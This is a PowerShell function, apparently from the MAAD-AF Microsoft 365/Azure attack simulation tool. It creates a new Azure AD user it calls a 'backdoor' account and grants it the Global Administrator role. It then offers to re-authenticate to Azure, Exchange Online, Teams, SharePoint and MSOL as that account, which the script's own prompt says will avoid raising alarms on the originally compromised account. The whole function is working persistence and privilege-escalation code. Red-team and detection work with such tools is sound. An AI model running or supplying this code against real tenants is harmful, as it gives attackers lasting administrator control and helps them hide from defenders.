function NewAdminAccountCreation {
    mitre_details("NewAdminAccountCreation")

    #Create Admin Account
    Write-Host "`nDisplaying available domain information:" @fg_yellow
    Get-AzureADDomain |Format-Table Name, SupportedServices, AuthenticationType
    $global:NewAdminUserName = Read-Host -Prompt 'Enter username for the new backdoor admin account (eg: user@domain.com)'
    $global:NewAdminUserPass = Read-Host -Prompt 'Enter password for the new backdoor admin account (must comply with password policy)'
    $global:NewAdminDisplayName = (Read-Host -Prompt 'Enter a display name for the new backdoor admin account')
    $global:NewAdminDisplayName = $global:NewAdminDisplayName  -replace " ","" 
    $global:NewAdminUserPassSecure = ConvertTo-SecureString $NewAdminUserPass -AsPlainText -Force 

    #Create new account
    try {
        Write-Host "`nCreating new backdoor account ...`n"
        New-AzADUser -DisplayName $global:NewAdminDisplayName -UserPrincipalName $global:NewAdminUserName -Password $global:NewAdminUserPassSecure -MailNickName $global:NewAdminDisplayName -ErrorAction Stop | Out-File -FilePath .\Outputs\Backdoor_Account.txt
        Start-Sleep -Seconds 10
        Write-Host "Successfully created new backdoor account!!!" @fg_yellow @bg_black
        Write-Host "`nDetails of backdoor account are logged in 'Backdoor_Account.txt'."
    }
    catch {
        Write-Host "Error: Failed to create new backdoor account!"     
        #$_
        break
    }
    
    #Retrieve new account ID
    $NewAdminUser = Get-AzADUser -ObjectId $global:NewAdminUserName
    $global:NewAdminUserOId = $NewAdminUser.Id

    #Retrieve role ID for Global Administrator
    try {
        Write-Host "`nInitiating recon to find and replicate Admin privileges...`n"
        $GlobalAdmin = Get-AzureADDirectoryRole | Where -Value "Global Administrator" -CIn DisplayName
        $global:GlobalAdminOId = $GlobalAdmin.ObjectId
    }
    catch {
        Write-Host "`nFailed to find Admin privileges!!!`n"
    }
    
    #Assign Admin Privileges
    Write-Host "Assigning Admin privileges to the new backdoor account..."
    try{
        Add-AzureADDirectoryRoleMember -ObjectId $global:GlobalAdminOId -RefObjectId $global:NewAdminUserOId -ErrorAction Stop
        Start-Sleep -Seconds 30
        #Add-RoleGroupMember -Identity "eDiscovery Manager" -Member $global:NewAdminUsername -ErrorAction Stop
        Write-Host "`nSuccessfully assigned admin privileges to backdoor account: $global:NewAdminUserName" @fg_yellow @bg_black
        Write-Host "`nNote: Selecting (Yes) will automatically restart the tool using new backdoor account and avoid raising alarms on the initially compromised user account" @fg_gray
        $use_backdoor = Read-Host -Prompt "Would you like to use the backdoor account to perform future actions (Yes/No)"
    }
    catch {
        Write-Error -Message "Failed to assign admin privilegs to backdoor account. Try Again!!!"
    }

    #Use backdoor account
    if ($use_backdoor -in "Yes","yes","Y","y") {
        #Terminating existing connections
        Write-Host "`n"
        terminate_connection
        ClearActiveSessions
        #Re-login again with backdoor account
        Write-Host "`nRestarting and configuring MAAD-AF to use backdoor account..." @fg_yellow @bg_black
        Write-Host "Note: This can typically take a while and multiple attempts (which MAAD-AF will automatically attempt). Be patient.`n" @fg_gray
        Start-Sleep -Seconds 5
        $attempt = 0
        #Create new credentials
        $global:NewAdminCredential = New-Object System.Management.Automation.PSCredential -ArgumentList ($global:NewAdminUsername, $global:NewAdminUserPassSecure)
        
        #Attempt login with backdoor account
        $attempt = 0
        while ($attempt -lt 10) {
            try {
                AccessAzureAD $global:NewAdminUsername $global:NewAdminCredential
                AccessAzAccount $global:NewAdminUsername $global:NewAdminCredential
                AccessTeams $global:NewAdminUsername $global:NewAdminCredential
                AccessExchangeOnline $global:NewAdminUsername $global:NewAdminCredential
                AccessMsol $global:NewAdminUsername $global:NewAdminCredential
                AccessSharepoint $global:NewAdminUsername $global:NewAdminCredential
                AccessSharepointAdmin $global:NewAdminUsername $global:NewAdminCredential
                
                Write-Host "Successfully logged in using new backdoor admin account!!!" @fg_yellow @bg_black
                Write-Host "You are now logged in as $global:NewAdminDisplayName : $global:NewAdminUserName" @fg_yellow @bg_black
                #Overwrite primary username for other modules
                $global:AdminUsername = $global:NewAdminUserName
                $global:OldAdminCredential = $global:AdminCredential
                $global:AdminCredential = $global:NewAdminCredential
                break
            }
            catch {
                Write-Host "`nFailed to establish access to one or more services using backdoor account!" @fg_red
                $attempt++
                Write-Host "`nAttempting connection again..."
                Start-Sleep -Seconds 30
            }    
        }
    }
    else {
        $allow_undo = $true
    }
    
    if ($allow_undo -eq $true) {
        Write-Host "`n"
        $user_confirm = Read-Host -Prompt 'Would you like to undo creating backdoor account? (yes/no)'

        if ($user_confirm -notin "No","no","N","n") {
            Write-Host "`nDeleting AD user: $NewAdminUserName ..."
            Remove-AzureADUser -ObjectId $NewAdminUserOId
            Start-Sleep -Seconds 3
            Write-Host "`nUndo successful: Deleted newly added backdoor account $NewAdminUserName" @fg_yellow @bg_black
        }
    }
    Pause
}